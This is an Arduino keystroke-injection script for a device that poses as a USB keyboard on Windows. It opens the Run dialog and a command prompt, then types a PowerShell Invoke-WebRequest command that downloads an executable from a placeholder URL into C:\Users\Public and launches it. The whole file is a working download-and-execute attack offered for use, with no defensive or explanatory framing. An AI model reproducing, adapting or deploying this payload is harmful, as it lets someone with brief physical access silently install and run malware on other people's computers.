#include <HIDKeyboard.h>  // Custom HIDKeyboard library
HIDKeyboard keyboard;

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */

#define KEY_LEFT_GUI 0x08  // Define Windows key
#define KEY_R 21           // Define 'R' key (HID code)
#define KEY_ENTER 0x28     // Define Enter key

void setup() {
  Serial.begin(9600);  // Initialize Serial communication
  delay(200);  // Small delay for initialization
}

void loop() {
  // Step 1: Open the Run dialog (Windows Key + R)
  buf[0] = KEY_LEFT_GUI;  // Hold Windows key
  buf[2] = KEY_R;         // Press 'R'
  Serial.write(buf, 8);   // Send keypress
  delay(200);             // Small delay
  buf[0] = 0;             // Release Windows key
  buf[2] = 0;             // Release 'R'
  Serial.write(buf, 8);   // Send key release
  delay(1000);            // Wait for Run dialog to appear

  // Step 2: Open Command Prompt by typing 'cmd'
  keyboard.println("cmd");
  delay(500);             // Wait for 'cmd' to be typed
  buf[2] = KEY_ENTER;     // Press Enter
  Serial.write(buf, 8);   // Send Enter keypress
  delay(200);
  buf[2] = 0;             // Release Enter key
  Serial.write(buf, 8);   // Send key release
  delay(1500);            // Wait for Command Prompt to open

  // Step 3: Use PowerShell to download the file
  keyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'url_to_your_exe_file' -OutFile 'C:\\\\Users\\\\Public\\\\main.exe'\"");
  delay(1000);            // Wait for the PowerShell command to be typed
  buf[2] = KEY_ENTER;     // Press Enter
  Serial.write(buf, 8);   // Send Enter keypress
  delay(200);
  buf[2] = 0;             // Release Enter key
  Serial.write(buf, 8);   // Send key release
  delay(5000);            // Wait for the file to download

  // Step 4: Run the downloaded file
  keyboard.println("start C:\\\\Users\\\\Public\\\\main.exe");
  delay(500);             // Wait for the command to type out
  buf[2] = KEY_ENTER;     // Press Enter
  Serial.write(buf, 8);   // Send Enter keypress
  delay(200);
  buf[2] = 0;             // Release Enter key
  Serial.write(buf, 8);   // Send key release

  // End the script
  while (1);  // Prevent the loop from running again
}
